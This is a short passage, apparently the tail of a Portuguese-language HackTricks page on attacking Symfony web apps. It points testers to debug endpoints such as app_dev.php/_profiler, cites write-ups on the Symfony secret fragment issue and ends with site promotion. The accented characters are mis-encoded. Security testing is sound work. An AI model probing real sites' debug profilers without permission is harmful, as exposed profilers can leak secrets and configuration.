![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### Outros Endpoints com Depura√ß√£o Habilitada

Voc√™ tamb√©m deve verificar estes URLs:

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## Refer√™ncias

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
